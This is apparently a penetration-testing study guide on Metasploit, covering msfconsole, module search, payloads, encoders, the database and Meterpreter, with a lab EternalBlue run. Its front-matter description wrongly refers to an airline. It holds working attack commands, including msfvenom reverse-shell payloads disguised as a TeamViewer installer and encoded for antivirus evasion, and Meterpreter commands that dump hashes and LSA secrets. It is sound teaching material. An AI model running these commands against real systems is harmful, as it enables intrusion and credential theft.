---
title: "Metasploit"
description: "The national flag carrier of the Kingdom of Bhutan, Drukair connects Bhutan to the world."
pubDate: "April 16 2025"
heroImage: "/metasploit.png"
---

# 🛠️ Introduction to Metasploit & MSFconsole

---

## Preface

Discussions around tools in the information security field have intensified recently. Some debates stem from personal preferences, while others focus on policies regarding tool disclosure. Despite these varying opinions, one fact remains: automated tools play a crucial role in modern security assessments.

### Key Arguments for and Against Tools

- **Against:**
  - Reduce the opportunity for analysts to showcase manual skill.
  - Create a false sense of competence.
  - Encourage over-reliance and "tunnel vision."

- **For:**
  - Aid newcomers with user-friendly learning environments.
  - Save time during complex assessments.
  - Highlight vulnerabilities quickly for triage and deeper research.

### Risks of Tools

- May establish a comfort zone that limits growth.
- Can become liabilities if misused or misunderstood.
- Might leave traces or introduce new vulnerabilities.

### Discipline in Security Work

- **Time is limited** — focus on high-impact issues first.
- **Client priorities matter** — they seek results, not ego validation.
- **Self-discipline over peer validation** — impress yourself, not the crowd.

---

## Conclusion

- Tools are **helpers**, not substitutes for knowledge.
- Understand your tools thoroughly — every function and class.
- Maintain a rigorous **methodology** to mitigate risks and ensure efficiency.
- Tools provide **educational value** for beginners and **productivity gains** for professionals.
- As technology evolves, use the saved time for **deeper security research**.

---

# 🔍 Introduction to Metasploit

Metasploit is a **modular penetration testing platform** built on Ruby. It enables testers to write, test, and execute exploit code—either custom or from a curated exploit database.

### Highlights

- Modular architecture: supports exploits, payloads, encoders, etc.
- Easy switching between targets and sessions.
- Excellent for post-exploitation activities.

---

## 🧰 Metasploit Pro vs. Framework

| Feature                      | Metasploit Framework | Metasploit Pro        |
|-----------------------------|----------------------|------------------------|
| GUI                         | ❌                   | ✅                     |
| Task Chains & Wizards       | ❌                   | ✅                     |
| Social Engineering          | ❌                   | ✅                     |
| Nexpose Integration         | ❌                   | ✅                     |
| Command-Line Support        | ✅                   | ✅                     |
| Credential & Session Mgmt   | ⚠️ Manual            | ✅ Streamlined         |

---

# 🧵 MSFconsole: The Core Interface

The `msfconsole` is the primary and most powerful interface for Metasploit Framework users.

### Features

- Tab-completion and command history
- Supports external command execution
- Offers access to the **entire Metasploit module database**
- Fully scriptable and customizable

### Launching MSFconsole

```bash
msfconsole
```

Or launch without the banner:

```bash
msfconsole -q
```

### Updating Metasploit

Use your OS's package manager (e.g., apt) to install/update:

```bash
sudo apt update && sudo apt install metasploit-framework
```

---

# 🏗️ Metasploit File Structure

Default path: `/usr/share/metasploit-framework/`

| Directory          | Purpose                                |
|-------------------|----------------------------------------|
| `modules/`        | Contains all module types               |
| `plugins/`        | Adds additional features and automation |
| `scripts/`        | Meterpreter & custom scripts            |
| `tools/`          | Command-line utilities                  |
| `data/` & `lib/`  | Backend logic & configurations          |
| `documentation/`  | Technical references and manuals        |

#### Module Subfolders

```bash
ls /usr/share/metasploit-framework/modules
# auxiliary  encoders  evasion  exploits  nops  payloads  post
```

---

## 🧠 Understanding the Architecture

- Know what each part of Metasploit does before you use it.
- Blindly trusting a tool can result in unexpected behaviors and client risk.
- Always audit, document, and test any custom or third-party additions.

---

# 🧭 MSF Engagement Structure

Metasploit assessments typically follow five key phases:

1. **Enumeration** – Identify target services and their versions.
2. **Preparation** – Configure the correct exploits and payloads.
3. **Exploitation** – Gain access to the system.
4. **Privilege Escalation** – Extend privileges if needed.
5. **Post-Exploitation** – Extract, analyze, and clean up.

These stages help in organizing work and selecting the right Metasploit tools for each task.

    MSF Engagement Structure
    │
    ├── Enumeration
    │   ├── Service Validation
    │   │   ├── Passive Scanning
    │   │   │   ├── OSINT
    │   │   │   ├── Interacting with services legitimately
    │   │   │   └── whois / DNS records
    │   │   ├── Active Scanning
    │   │   │   ├── nMap / Nessus / NexPose scans
    │   │   │   ├── Web service identification tools
    │   │   │   └── Built-with identification tools
    │   └── Vulnerability Research
    │       ├── VulnDB (GUI)
    │       ├── Rapid7 (GUI)
    │       │   ├── search [vuln_name]
    │       │   └── use [index no.]
    │       ├── SearchSploit (CLI)
    │       └── Google Dorking (GUI)
    │
    ├── Preparation
    │   ├── Code Auditing
    │   ├── Dependency Check
    │   └── Importing Custom Modules
    │
    ├── Exploitation
    │   ├── Run Module Locally
    │   ├── Set Parameters
    │   │   ├── Options (show options)
    │   │   │   ├── URI
    │   │   │   ├── Proxies
    │   │   │   ├── RHOST / RPORT
    │   │   │   ├── Usernames
    │   │   │   │   └── set [option] [value]
    │   │   │   ├── Passwords
    │   │   │   ├── Dictionaries
    │   │   │   ├── Session
    │   │   ├── Payloads (show payloads)
    │   │   │   ├── set payload [index no.]
    │   │   │   ├── Meterpreter
    │   │   │   ├── Shell Binds
    │   │   │   ├── Reverse Shells
    │   │   │   └── Exec
    │   │   └── Targets (show targets)
    │   │       ├── set target [OS]
    │   │       ├── Linux
    │   │       ├── Windows
    │   │       ├── MacOS
    │   │       └── Others
    │   └── Run/Exploit
    │
    ├── Privilege Escalation
    │   ├── Vulnerability Research
    │   ├── Credential Gathering
    │   └── Run Module Locally
    │
    ├── Next Target
    │   └── Return to Enumeration,repeat until highest privilege obtained
    │
    └── Post-Exploitation
        ├── Token Impersonation
        ├── Pivoting to Other Systems
        ├── Credential Gathering
        ├── Data Exfiltration
        └── Cleanup

---

## 🚨 Enumeration is Key

Before exploitation, enumeration gives critical insight into the target:

- Identify services (HTTP, FTP, SQL, etc.)
- Gather version details
- Use tools like Nmap, Netcat, or Metasploit auxiliary scanners (cautiously)

**Reminder:** Vulnerabilities often exist in *specific versions* — knowing these helps in selecting the right module.

---

# 📦 Metasploit Modules and Search Functionality

Metasploit modules are pre-built scripts designed for specific tasks, such as exploitation, scanning, or post-exploitation. These have been tested in real-world scenarios and serve as an essential toolkit for penetration testers.

> ⚠️ A failed exploit **does not** necessarily indicate the absence of a vulnerability—it may just require customization to match the target environment.

---

## 🗂 Module Structure

Each module follows this syntax:

```
<type>/<os>/<service>/<name>
```

**Example:**
```
exploit/windows/ftp/scriptftp_list
```

### 📌 Module Fields

| Field | Description |
|-------|-------------|
| **No.** | Index number used to select modules easily during searches |
| **Type** | Function of the module (e.g., exploit, auxiliary, payload) |
| **OS** | Targeted operating system |
| **Service** | Vulnerable service or action being targeted |
| **Name** | Specific functionality or purpose of the module |

---

### 🔍 Module Types

| Type | Description |
|------|-------------|
| `auxiliary` | Scanning, sniffing, and non-exploit functionality |
| `encoders` | Ensure payload delivery remains intact |
| `exploits` | Target and exploit known vulnerabilities |
| `nops` | Maintain payload size consistency |
| `payloads` | Remote code executed after successful exploit |
| `plugins` | Add functionality to `msfconsole` |
| `post` | Actions performed after exploitation (e.g., data gathering) |

> `use <No.>` can only be applied to modules of types: `auxiliary`, `exploit`, and `post`.

---

## 🔎 Searching for Modules in `msfconsole`

Use the `search` command to filter modules using tags and keywords.

### 🛠 Syntax:
```
search [options] [keywords:value]
```

### 🧩 Useful Options:

| Option | Description |
|--------|-------------|
| `-h` | Help |
| `-o <file>` | Export results to CSV |
| `-S <regex>` | Regex-based filtering |
| `-u` | Auto-use if only one result |
| `-s <column>` | Sort results by column |
| `-r` | Reverse order |

### 📌 Keywords:

- `type:` (e.g., exploit, post)
- `platform:` (e.g., windows, linux)
- `cve:` (e.g., 2017-0143)
- `name:`, `path:`, `rank:`, `arch:`, etc.

### 🧪 Examples:

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search cve:2009 type:exploit platform:-linux
search type:exploit -s type -r
```

---

## 🛠 Module Selection and Use

Suppose a target has SMB running on port 445 and may be vulnerable to **MS17-010** (EternalRomance).

### Step 1: Perform a Scan

```bash
nmap -sV <target-ip>
```

Check for open ports like 445/tcp (SMB), and OS information.

### Step 2: Search for Vulnerable Module

```bash
search ms17_010
```

**Example result:**
```
exploit/windows/smb/ms17_010_psexec
auxiliary/admin/smb/ms17_010_command
```

### Step 3: Use the Module

```bash
use 0
```

> Use the index number from the search result to quickly select modules.

---

## ⚙️ Configuring a Module

After selecting, use:

```bash
show options
```

This lists required parameters (e.g., RHOSTS, RPORT, LHOST, etc.).

### Example Required Fields

| Name | Required | Description |
|------|----------|-------------|
| `RHOSTS` | Yes | Target IP address |
| `RPORT` | Yes | Target port (default: 445 for SMB) |
| `LHOST` | Yes | Attacker's IP address for payload callbacks |
| `LPORT` | Yes | Attacker's listening port |
| `SHARE` | Yes | SMB share (e.g., ADMIN$) |

### Example Payload:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
```

---

## 📌 Global Settings

To avoid re-setting IPs every time, use:

```bash
setg RHOSTS <target-ip>
```

This persists across different modules until Metasploit is restarted.

---

## ℹ️ Get Module Info

```bash
info
```

Displays module purpose, authors, references (CVE, ExploitDB), architecture, privilege requirements, and detailed usage notes.

---

## 📚 References

- [MS17-010 Microsoft Advisory](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010)
- [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143)
- [Github: MS17-010 Research](https://github.com/worawit/MS17-010)
- [Hitcon 2017 Presentation (PDF)](https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf)

---

# 🎯 Metasploit Targets & Target Selection

## 📌 What Are Targets?

Targets in Metasploit are unique OS identifiers tied to specific versions that the exploit supports. Each exploit module may support multiple targets based on the operating system, service packs, and language packs.

---

## 🔎 Viewing Available Targets

### ❗ Without Selecting an Exploit
```bash
msf6 > show targets
[-] No exploit module selected.
```

This tells us that we must select an exploit module before listing its supported targets.

---

### ✅ Example: `ms17_010_psexec`

After selecting the exploit:
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > show targets
```

If there's only one target:
```text
Id  Name
--  ----
0   Automatic
```

This means the module will automatically detect the target system version and adapt accordingly.

---

## ⚙️ Module Options Example

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

Key options:
- `RHOSTS`: Target IP address
- `RPORT`: Default SMB port (usually 445)
- `SMBUser` / `SMBPass`: SMB credentials if needed
- `SHARE`: Network share (default: `ADMIN$`)

Payload options (`windows/meterpreter/reverse_tcp`):
- `LHOST`: Attacker's IP
- `LPORT`: Listening port
- `EXITFUNC`: Exit technique (e.g., `thread`, `process`)

---

## 📘 Example: Internet Explorer UAF Exploit

**Exploit:** `exploit/windows/browser/ie_execcommand_uaf`  
**Vulnerability:** MS12-063 - Use-After-Free in Internet Explorer

```bash
msf6 > use exploit/windows/browser/ie_execcommand_uaf
msf6 exploit(...) > info
```

### 🔐 Vulnerability Details
- **Disclosed:** 2012-09-14
- **CVE:** [CVE-2012-4969](https://cvedetails.com/cve/CVE-2012-4969/)
- **Browsers Affected:** IE 7, IE 8, IE 9
- **Platforms:** Windows XP, Vista, 7
- **Requirements:**
  - For XP/IE8: `msvcrt` must be present.
  - For Vista/7: Java Runtime Environment (JRE) 1.6.x or below must be installed.

---

## ⚙️ Module Options

```bash
msf6 exploit(...) > options
```

| Name      | Current Setting | Required | Description                                         |
|-----------|-----------------|----------|-----------------------------------------------------|
| OBFUSCATE | false           | no       | Enable JavaScript obfuscation                       |
| SRVHOST   | 0.0.0.0         | yes      | Local host to listen on                             |
| SRVPORT   | 8080            | yes      | Local port to listen on                             |
| SSL       | false           | no       | Negotiate SSL for incoming connections              |
| URIPATH   | (random)        | no       | URI path for the exploit                            |

---

## 📋 Available Targets

```bash
msf6 exploit(...) > show targets
```

| Id | Target Description        |
|----|---------------------------|
| 0  | Automatic                 |
| 1  | IE 7 on Windows XP SP3    |
| 2  | IE 8 on Windows XP SP3    |
| 3  | IE 7 on Windows Vista     |
| 4  | IE 8 on Windows Vista     |
| 5  | IE 8 on Windows 7         |
| 6  | IE 9 on Windows 7         |

---

## 🎯 Setting a Specific Target

If you know the exact environment:
```bash
msf6 exploit(...) > set target 6
target => 6
```

---

## 🧠 Understanding Target Types

Target types vary due to:
- OS version
- Service pack
- Language pack
- Memory layout differences

Exploit success often depends on:
- **Return addresses** (e.g., `jmp esp`, `pop/pop/ret`)
- **Hooks** or loaded libraries
- **ROP chains** (in browser or modern exploits)

---

## 🛠️ Return Address Discovery

To identify valid return addresses:
1. **Get the vulnerable binary** (e.g., .DLL or .EXE)
2. Use tools like:
   - `msfpescan`
   - `ropper`
   - `monalisa` (in Immunity Debugger)

---

# Metasploit Payloads

## Overview

A **payload** in Metasploit is a module that works alongside an **exploit** to execute malicious code on a target system, typically to establish a reverse shell or remote access.

There are **three types of payloads** in Metasploit:

- **Singles**
- **Stagers**
- **Stages**

Payloads are selected and configured in conjunction with exploits. The structure of the payload name can indicate whether it's staged or not:

- `windows/shell_bind_tcp`: a *single* payload.
- `windows/shell/bind_tcp`: a *staged* payload.

---

## Payload Types

### 🧩 Single Payloads

- Contain the **entire shellcode and functionality** in one package.
- Easier to use, more **stable**, but can be **large in size**.
- Example use case: creating a user or starting a service.

### 🔌 Stagers

- Small and **reliable**.
- Set up a **network connection** back to the attacker's machine.
- Download additional code (stage) upon successful execution.
- Typically used to **bypass size limitations** in some exploits.

#### NX vs. No-NX (DEP/CPU considerations)

- NX-compatible stagers are **larger** due to memory allocation functions.
- Metasploit defaults to NX-compatible + Windows 7 support.

### 🧱 Stages

- Downloaded **after** the stager connects.
- Provide **advanced features**, e.g., Meterpreter, VNC injection.
- Allow **modular exploitation**, evading AV and IPS more effectively.
- Example: `reverse_tcp` → connects back to attacker, receives full payload (e.g., Meterpreter).

**Stage0** = initial small payload to initiate connection  
**Stage1** = full payload granting remote access

---

## Meterpreter Payload

- Advanced, **in-memory** payload using **DLL injection**.
- **No disk footprint** = difficult to detect.
- **Modular**: load/unload scripts and plugins dynamically.
- Examples of Meterpreter capabilities:
  - Screenshotting
  - Microphone access
  - Keystroke logging
  - Password hash dumping
  - Security token impersonation

---

## Searching for Payloads

To list all available payloads:

```bash
msf6 > show payloads
```

### Using `grep` to Filter

To filter payloads by keyword:

```bash
msf6 > grep meterpreter show payloads
[*] 14 results
```

Further narrow down to `reverse_tcp`:

```bash
msf6 > grep meterpreter grep reverse_tcp show payloads
[*] 3 results:
payload/windows/x64/meterpreter/reverse_tcp
payload/windows/x64/meterpreter/reverse_tcp_rc4
payload/windows/x64/meterpreter/reverse_tcp_uuid
```

---

## Selecting and Setting Payloads

Once an exploit is selected, set the payload using:

```bash
msf6 > set payload windows/x64/meterpreter/reverse_tcp
```

To view payload-specific options:

```bash
msf6 > show options
```

### Example: Payload Options

```bash
Payload options (windows/x64/meterpreter/reverse_tcp):

Name      | Current Setting | Required | Description
----------|------------------|----------|------------
EXITFUNC  | thread           | yes      | Exit technique
LHOST     | [your IP]        | yes      | Local IP (attacker)
LPORT     | 4444             | yes      | Listening port
```

You can check your LHOST quickly:

```bash
msf6 > ifconfig
```

---

## Parameters Summary

| Module        | Parameter | Description                               |
|---------------|-----------|-------------------------------------------|
| Exploit       | RHOSTS    | Target IP address                         |
| Exploit       | RPORT     | Target port (usually 445 for SMB)         |
| Payload       | LHOST     | Attacker IP address (local interface)     |
| Payload       | LPORT     | Listening port (ensure it's available)    |

---

# Metasploit - Exploit and Payload Configuration

## Setting LHOST and RHOSTS

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > ifconfig
[*] exec: ifconfig
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500
inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15
```

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
LHOST => 10.10.14.15

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```

## Running the Exploit

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.15:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS and arch selected based on SMB reply.
...
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully!
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158)
```

## Meterpreter Commands

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Note: `whoami` is not supported in Meterpreter — use `getuid` instead.

### Listing Available Commands

```shell
meterpreter > help
```

#### Core Commands

| Command      | Description                                |
|--------------|--------------------------------------------|
| background   | Backgrounds the current session            |
| sessions     | Lists or interacts with active sessions    |
| run          | Executes a script or module                |
| load         | Load meterpreter extensions                |
| exit/quit    | Terminate session                          |

#### File System

| Command     | Description                |
|-------------|----------------------------|
| ls          | List directory contents    |
| cd          | Change directory           |
| upload      | Upload files               |
| download    | Download files             |

#### Networking

| Command     | Description                     |
|-------------|---------------------------------|
| ifconfig    | View network interfaces         |
| portfwd     | Port forwarding                 |
| netstat     | Display network connections     |

#### System Interaction

| Command     | Description                         |
|-------------|-------------------------------------|
| getuid      | Get user ID                         |
| ps          | List processes                      |
| migrate     | Move Meterpreter to another process |
| shell       | Open a system shell                 |
| sysinfo     | Get OS and architecture info        |

---

## Meterpreter Shell Usage

Navigating to user directory:

```shell
meterpreter > cd Users
meterpreter > ls
```

Switching to a full shell:

```shell
meterpreter > shell
Process 2664 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
C:\Users>
```

Inside the shell:

```cmd
C:\Users>whoami
nt authority\system
```

---

## Common Windows Payloads

| Payload                                | Description                                                |
|----------------------------------------|------------------------------------------------------------|
| `generic/shell_reverse_tcp`            | Standard reverse TCP shell                                |
| `windows/x64/shell_reverse_tcp`        | x64 reverse shell (no stager)                             |
| `windows/x64/shell/reverse_tcp`        | x64 reverse shell using stager                            |
| `windows/x64/meterpreter/reverse_tcp`  | Meterpreter with stager over TCP                          |
| `windows/x64/messagebox`               | Spawns a Windows MessageBox                               |
| `windows/x64/exec`                     | Executes a specified command                              |
| `windows/x64/powershell_reverse_tcp`   | PowerShell-based reverse shell                            |
| `windows/x64/vncinject/reverse_tcp`    | Remote GUI via VNC injection                              |

Note: Other tools like **Empire** and **Cobalt Strike** offer advanced post-exploitation payloads but are beyond the scope of this course.

# 🔐 Encoders in Metasploit

Encoders in the **Metasploit Framework** serve two primary purposes:

1. **Payload Compatibility**: Ensuring the payload works on different processor architectures.
2. **Antivirus Evasion**: Obfuscating payloads to bypass antivirus (AV) and intrusion detection/prevention systems (IDS/IPS).

---

## 🖥️ Supported Architectures
Metasploit encoders help adapt payloads to:
- `x86`
- `x64`
- `sparc`
- `ppc`
- `mips`

They also help remove **bad characters** from payloads (e.g., null bytes or other restricted characters).

---

## 🔄 Evolution of Encoders

- **Pre-2015**: Tools like `msfpayload` and `msfencode` were used.
- **Post-2015**: Replaced by a unified tool, `msfvenom`, for payload generation and encoding.

### Legacy Example (Pre-2015):
```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t perl
```

### Modern Example (msfvenom):
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f perl
```

---

## **🧬 Notable Encoder: Shikata Ga Nai (仕方がない)**

![Metasploit Module Layout](https://hatching.io/static/images/blog/metasploit-part2/metasploit-part2-1.gif)

---
- **Type**: Polymorphic XOR additive feedback encoder
- **Meaning**: Japanese for "It cannot be helped"
- **Status**: Once the gold standard for evasion, but no longer effective against modern AV/EDR due to better signature detection.

### Example:
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 10 -f exe -o TeamViewerInstall.exe
```
- `-i 10`: Apply the encoder 10 times (multi-iteration encoding)
- Final `.exe` may still be detected by most AV software.

---

## 🧪 Testing AV Detection

Use the optional `msf-virustotal` script:
```bash
msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
```

---

## 🔍 Listing Available Encoders

Use `show encoders` in `msfconsole` to view compatible encoders:
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > show encoders
```

### Sample Output:
| Name                  | Rank      | Description                                  |
|-----------------------|-----------|----------------------------------------------|
| generic/none          | Manual    | No encoding                                  |
| x64/xor               | Manual    | XOR Encoder                                  |
| x64/xor_dynamic       | Manual    | Dynamic key XOR Encoder                      |
| x86/shikata_ga_nai    | Excellent | Polymorphic XOR Additive Feedback Encoder    |
| x86/alpha_upper       | Low       | Alphanumeric uppercase encoder               |
| x86/fnstenv_mov       | Normal    | Variable-length `fnstenv/mov` encoder        |
| ...                   | ...       | ...                                          |

*Note: Only compatible encoders are shown depending on the selected payload/exploit.*

---

## 🛡️ Reality Check: AV Evasion

Even multiple iterations of encoding (e.g., 10× `shikata_ga_nai`) will **not guarantee** AV evasion. Many antivirus engines detect common encoded payloads regardless of obfuscation:

- 🔍 Sample detection stats (from VirusTotal scan):  
  **51/68 AV engines** flagged the payload  
  ➤ AVs like BitDefender, Microsoft, Avast, Symantec, Sophos all detected it

---

## 🧠 Summary

- Encoders are still useful for compatibility and basic obfuscation
- `shikata_ga_nai` is popular but no longer reliable for full AV evasion
- Detection can often still occur even after heavy encoding
- Use evasion techniques in conjunction with other tools/methods (e.g., custom loaders, packers, encryption)

---

# 🧰 Metasploit Database: `msfconsole` Essentials

A powerful feature of Metasploit is its integration with PostgreSQL for storing and organizing recon data, credentials, loot, and more. Below is a detailed and neatly formatted reference for working with MSF databases.

---

## ⚙️ Setup & Initialization

### ✅ Start PostgreSQL
```bash
sudo systemctl start postgresql
```

### 🔄 Initialize/Check DB
```bash
sudo msfdb init
msf6 > db_status
```
Look for: `[*] Connected to msf. Connection type: PostgreSQL.`

If not connected, try:
```bash
sudo msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
```

---

## 🛠️ Core Database Commands

```bash
msf6 > help database
```

| Command         | Description                                |
|----------------|--------------------------------------------|
| `db_status`     | Check database connection                  |
| `db_connect`    | Connect to an existing DB                  |
| `db_disconnect` | Disconnect current DB                      |
| `db_import`     | Import scan results (Nmap XML, Nessus, etc.) |
| `db_export`     | Export workspace data to file              |
| `db_nmap`       | Run Nmap and automatically store results   |
| `hosts`         | View discovered hosts                      |
| `services`      | View scanned services                      |
| `vulns`         | View known vulnerabilities                 |
| `loot`          | View stored loot                           |
| `notes`         | View notes                                 |
| `workspace`     | Manage multiple environments               |

---

## 🗂️ Workspaces

### 📂 Manage Workspaces
```bash
msf6 > workspace -a Target_1       # Add
msf6 > workspace Target_1          # Switch
msf6 > workspace -d Target_1       # Delete
msf6 > workspace                   # List
```

---

## 📥 Import & Export

### 📥 Import Scan Results
```bash
msf6 > db_import scan.xml
```

### 📤 Export Current Workspace
```bash
msf6 > db_export -f xml backup.xml
```

---

## 🧾 Hosts Command

```bash
msf6 > hosts -h
```

- Add, update, delete hosts
- Tag, filter, and export
- Set `RHOSTS` directly from hosts list

---

## 🛎️ Services Command

```bash
msf6 > services -h
```

| Option | Description |
|--------|-------------|
| `-a`   | Add service(s) |
| `-d`   | Delete service(s) |
| `-c`   | Show only specific columns |
| `-r`   | Protocol filter (`tcp` or `udp`) |
| `-p`   | Filter by port |
| `-s`   | Filter by service name |
| `-u`   | Show only **up** services |
| `-o`   | Output to CSV |
| `-S`   | Set RHOSTS from results |
| `-R`   | Filter by RHOSTS |
| `-O`   | Sort output by column |
| `-U`   | Update data for existing services |

🧠 **Tip:** Services are searchable and sortable. You can refine your output or set module targets directly from results.

---

## 🔐 Credentials (`creds`)

```bash
msf6 > creds -h
```

### 🧾 Listing Examples
```bash
creds                        # Show all
creds 192.168.0.0/24         # Filter by login range
creds -p 22,445              # By port
creds -s ssh,smb             # By service
creds -t ntlm                # By type
creds -j md5                 # John the Ripper type
```

### ➕ Add Credential Examples
```bash
creds add user:admin password:notpassword realm:workgroup
creds add password:'justapassword'
creds add ntlm:E2FC1...:A1074...
creds add user:sshadmin ssh-key:/path/to/key
creds add user:postgres postgres:md5abc123...
```

### 🗑️ Delete Credentials
```bash
creds -d -s smb              # Delete all SMB credentials
```

### 🧰 Options
| Option | Description |
|--------|-------------|
| `-o`   | Export to CSV, JTR, or Hashcat format |
| `-d`   | Delete credentials |
| `-P`   | Filter by password |
| `-u`   | Filter by username |
| `-t`   | Filter by type (password, ntlm, hash, etc.) |
| `-O`   | Filter by origin |
| `-R`   | Set RHOSTS from results |

---

## 🎯 Loot Command

```bash
msf6 > loot -h
```

Loot includes things like dumped hashes, captured files, or system info.

### 🧾 Usage
```bash
loot                        # List loot
loot -S admin               # Search loot
loot -d 192.168.0.1         # Delete loot for host
loot -f creds.txt -i "Admin hash dump" -a 192.168.0.1 -t hash
```

| Option | Description |
|--------|-------------|
| `-a`   | Add loot to host(s) |
| `-d`   | Delete loot |
| `-f`   | File containing loot data |
| `-i`   | Info/description of loot |
| `-t`   | Loot type (e.g., hash, passwd, etc.) |
| `-S`   | Search by keyword |
| `-h`   | Help |

---

## 🔐 Hash Types Reference (for JTR)

| Type         | Value           |
|--------------|------------------|
| DES          | `des`            |
| MD5          | `md5`            |
| SHA256       | `sha256`         |
| SHA512       | `sha512`         |
| Oracle 11    | `oracle11`       |
| Postgres MD5 | `postgres`       |
| MSSQL        | `mssql` / `mssql12` |
| MySQL        | `mysql` / `mysql-sha1` |

---

## 🧠 Pro Tip

🎯 Combine recon results with module targeting using:
```bash
services -S        # Set RHOSTS from found services
hosts -R           # Set RHOSTS from found hosts
creds -R           # Set RHOSTS from found logins
```

---

## Plugins 🔌
- Plugins are third-party software integrated within the Metasploit framework 🤝
- They enhance functionality by bringing external tools into msfconsole 🧰
- Plugins work directly with the API to manipulate the framework 🔄
- Can automate repetitive tasks, add new commands, and extend functionality ✨

### Using Plugins 🚀
- Default location: `/usr/share/metasploit-framework/plugins` 📁
- Load with: `load plugin_name` (Example: `load nessus`) ⚙️
- Each plugin has its own set of commands (view with `plugin_help`) 📝
- If plugin is not installed properly, you'll receive an error message ❌

### Installing New Plugins 📥
- Can be installed by placing .rb files in the plugins directory 💎
- Example of community plugins: DarkOperator's Metasploit-Plugins 🔥
- Process: 
  1. Download plugin files 📥
  2. Copy to plugins directory 📋
  3. Set proper permissions 🔒
  4. Load via msfconsole 🚀

### Popular Plugins 🌟
- nMap (pre-installed) 🗺️
- NexPose (pre-installed) 🔍
- Nessus (pre-installed) 🔎
- Mimikatz (pre-installed V.1) 🔑
- Stdapi (pre-installed) 📊
- Darkoperator's plugins 🧩

## Sessions 💻
- Allow managing multiple modules simultaneously 🔄
- Create dedicated control interfaces for deployed modules 🎮
- Sessions can be backgrounded and still continue to run ⏱️
- Can switch between sessions and link different modules 🔀

### Managing Sessions 🎛️
- Background session: `CTRL+Z` or `background`/`bg` command ⏯️
- List active sessions: `sessions` command 📋
- Interact with specific session: `sessions -i [session_number]` 🎯
- Particularly useful for running post-exploitation modules 🧪

## Jobs 🏃‍♂️
- Background tasks that continue running even if sessions die 🔄
- Useful when needing to free up ports for other modules 🔌
- View jobs: `jobs -l` 👀
- Kill specific job: `jobs -k [job_id]` ☠️
- Kill all jobs: `jobs -K` 💥
- Run exploit as background job: `exploit -j` 🏎️

## Meterpreter 🦾
- Advanced multi-functional payload 💪
- Uses DLL injection for stable connections 💉
- Resides entirely in memory (leaves no traces on hard drive) 👻
- Difficult to detect with conventional forensic techniques 🕵️‍♀️

### Meterpreter Features 🌟
- **Stealthy** 🥷: Resides in memory, no disk writing, can migrate between processes
- **Powerful** 💪: Uses channelized communication with AES encryption
- **Extensible** 🧩: Features can be added at runtime without rebuilding

### Key Meterpreter Commands 🎮
- `help`: Shows available commands 📚
- `getuid`: Display current user 👤
- `hashdump`: Extract password hashes 🔑
- `lsa_dump_sam`: Dump Security Account Manager database 📂
- `lsa_dump_secrets`: Dump LSA secrets 🔐
- `ps`: List running processes 📊
- `migrate [PID]`: Move to different process 🦅
- `steal_token [PID]`: Impersonate another user 🎭
- `background`/`bg`: Background current session ⏪

### Practical Usage Example 🎯
1. Scan target with nmap 🔍
2. Identify vulnerable service (e.g., IIS 6.0) 🎯
3. Search for and configure appropriate exploit ⚙️
4. Execute and receive Meterpreter shell 🐚
5. Run local exploit suggester to find privilege escalation paths 🪜
6. Execute privilege escalation exploit to gain SYSTEM access 👑

## MSFVenom 🐍
- Successor of MSFPayload and MSFEncode 👑
- Creates customized payloads for different architectures and platforms 🏗️
- Can encode shellcode to avoid bad characters and improve stability 🧬

### Creating Payloads 💣
- Syntax: `msfvenom -p [payload] [options]` ⌨️
- Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx` 📝
- Need to set up listener with multi/handler to catch connections 🎣

### Local Exploit Suggester 🕵️‍♂️
- Post-exploitation module to identify privilege escalation opportunities 🔍
- Usage:
  1. Background current session ⏪
  2. Load module: `use post/multi/recon/local_exploit_suggester` 🔧
  3. Set session number: `set SESSION [number]` 🔢
  4. Run module: `run` 🏃
  5. Select and try suggested exploits 🎯

## General Tips 💡
- Always close sessions and kill jobs when finished 🧹
- Backgrounded sessions and jobs consume resources 🔋
- Encode payloads for better success rates 🎯
- Use post-exploitation modules for efficient enumeration 📊
- Consider security implications of leaving traces on target systems 🚨
- Remember to document your findings for reporting 📝
- Practice in legal environments only! 🔒